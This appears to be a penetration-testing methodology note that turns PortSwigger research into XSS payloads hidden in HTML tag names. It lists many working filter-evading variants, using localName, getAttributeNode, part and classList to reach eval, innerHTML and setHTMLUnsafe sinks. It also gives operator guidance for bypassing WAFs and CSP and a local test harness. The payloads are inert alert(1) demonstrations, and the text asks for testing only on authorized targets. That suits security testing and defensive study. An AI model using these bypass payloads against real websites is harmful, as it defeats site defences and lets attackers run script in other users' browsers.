# XSS payload hiding in HTML tag names (WAF bypass)

A browser is far more lenient about what counts as an HTML **tag name** than most blocklists assume. A tag name does not have to be a known element — it just has to begin with a letter — and the DOM exposes lowercase/derived forms of that name through properties that a naïve signature scanner never looks at. This makes the tag name itself a payload-carrier: you can store JavaScript, a URL, or fresh markup *inside the tag name*, recover it at runtime through a property, and hand it to a JS evaluation or DOM sink. The result is a reliable XSS vector that often evades WAF and blocklist signatures because the payload string never appears as a normal `<script>` or `on*` handler in a way the scanner is tuned to catch.

Source technique: PortSwigger Research, "What's in a tag name? JavaScript, apparently" (Gareth Heyes, 2026-08-25).

## Why the trick works

Two facts combine:

1. **Browsers accept almost anything as a tag name.** After the leading alphabetic character, a tag name can contain alphanumerics, `/`, whitespace, and newlines. Line-separator and paragraph-separator characters are *not* transformed and are treated as newlines in JavaScript, so they can split an expression.
2. **The DOM exposes the raw tag name in derived properties.** The canonical one is `localName`, which holds the **lowercased** version of the tag name. Because the browser auto-uppercased the tag, `localName` hands you back a clean lowercase copy of whatever you embedded.

So the payload lives in the tag, and `localName` (or sibling properties) is the retrieval primitive.

## Core primitive (works in every browser)

Make any element focusable, chain `onfocus` onto itself, write the payload string into an attribute value, convert it to a function, and invoke it:

```html
<alert(1) onfocus="attributes[0].value=localName,new onfocus" autofocus tabindex=1>
```

- `tabindex=1` makes the (unknown) element focusable.
- `autofocus` fires `onfocus` immediately.
- `attributes[0].value` is the `onfocus` attribute's own string value, which is set to `localName` (the lowercase tag name = `alert(1)`).
- `new onfocus` coerces that string into a constructor/function and `new onfocus` invokes it.

## WAF / blocklist evasion variants

When a particular token is blocked, rotate the retrieval primitive or the focus mechanism:

**Uppercase JavaScript via `localName`:**

```html
<JAVASCRIPT:ALERT(1) onfocus=location=localName autofocus tabindex=1>
```

**Alternative attribute-value retrieval** (when `attributes[0].value` is blocked):

```html
<ALERT(1) onfocus="attributes[0].textContent=localName,new onfocus" autofocus tabindex=1>
<ALERT(1) onfocus="attributes[0].nodeValue=localName,new onfocus" autofocus tabindex=1>
```

**`getAttributeNode` retrieval** (forgotten primitive):

```html
<ALERT(1) onfocus="getAttributeNode('onfocus').value=localName,onfocus()" autofocus tabindex=1>
```

**`contenteditable` instead of `tabindex`** to make the element focusable:

```html
<JAVASCRIPT:ALERT(1) onfocus=location=localName autofocus contenteditable>
```

**Line-separator characters** (rendered as newlines in JS, evade single-line signatures):

```html
<alert(1) onfocus="attributes.onfocus.value=localName,new onfocus" autofocus tabindex=1>
```

**Opening angle bracket inside the tag name**, combined with the first attribute to produce fresh markup:

```html
<alert<img title=" src onerror=alert(1)> " onfocus=innerHTML=localName+attributes[0].value tabindex=1 autofocus>
```

**`setHTMLUnsafe`** (Svelte-context sink) with the tag name as the source:

```html
<alert<img title=" src onerror=alert(1)> " onfocus=setHTMLUnsafe(localName+title) tabindex=1 autofocus>
```

**`part` attribute array → `eval`** (the `part` attribute converts space-separated values into an array; overwrite the `event`/`onfocus` variables with `Function` and `eval` the payload portion):

```html
<ALERT(1) onfocus="event=localName;part=onfocus,onfocus=Function,eval(part[1])()" tabindex=1 autofocus>
```

**`classList` variant** of the `part` trick:

```html
<ALERT(1) onfocus="event=localName;classList=onfocus,onfocus=Function,eval(classList[1])()" tabindex=1 autofocus>
```

## Where to apply this as an operator

- **Contextual XSS with an active blocklist / WAF.** When a `<script>`, `onerror`, or `javascript:` payload is stripped but the surrounding markup is still reflected, try moving the payload into a tag name and reading it back through `localName` / `textContent` / `nodeValue` / `getAttributeNode`.
- **Strict CSP without a script-src 'unsafe-inline' but with a permissive `eval`/DOM-sink path.** The `part`/`classList` → `Function`/`eval` variants target `eval`-reaching contexts.
- **Frameworks with their own "unsafe HTML" sink** (e.g. Svelte `setHTMLUnsafe`). The tag name is a second, less-scanned input channel to that sink.
- **Fuzz the tag-name character set.** The transformation space is small but concrete: leading letter required; alphanumerics, `/`, whitespace, newlines allowed; case folded to uppercase on the tag and available lowercase via `localName`; line/paragraph separators preserved as JS newlines. Enumerate which characters your target's parser preserves.

## Lab harness (replayable, no external infra)

Minimal single-file check on any local HTML host:

```bash
cat > /tmp/tagname.html <<'HTML'
<!doctype html><html><body>
<h1>probe</h1>
<alert(1) onfocus="attributes[0].value=localName,new onfocus" autofocus tabindex=1>
</body></html>
HTML
python3 -m http.server 8080 --directory /tmp
# open http://127.0.0.1:8080/tagname.html in a browser with devtools open;
# a JS dialog / console eval of alert(1) confirms the primitive fires.
```

Positive result: the browser evaluates `alert(1)` from the tag name without any `<script>` tag or literal `onerror=`. Keep the payload inert (`alert(1)`, `document.title=localName`) — never load exfiltration, credential access, or a remote script.

## Safe boundaries

- Prove with `alert(1)` / title-change / console marker only. Do not fetch, exfiltrate, touch cookies, or run a remote payload.
- Test on a lab host or explicitly authorized target with a writable reflection point; do not inject into other users' sessions.
- Do not combine with stored payloads on shared/production systems without explicit engagement scope.

## Reporting heuristics

- Name the exact retrieval primitive used (`localName`, `textContent`, `nodeValue`, `getAttributeNode`, `part`, `classList`) and the focus mechanism (`tabindex`, `contenteditable`, `autofocus`).
- Show the blocklist/WAF that rejected the "normal" form and accepted the tag-name form (control pair).
- Note browser engine coverage (the core primitive is cross-browser per the source; verify per-target engine before claiming).
- Keep the payload inert and the reflection point clearly identified.
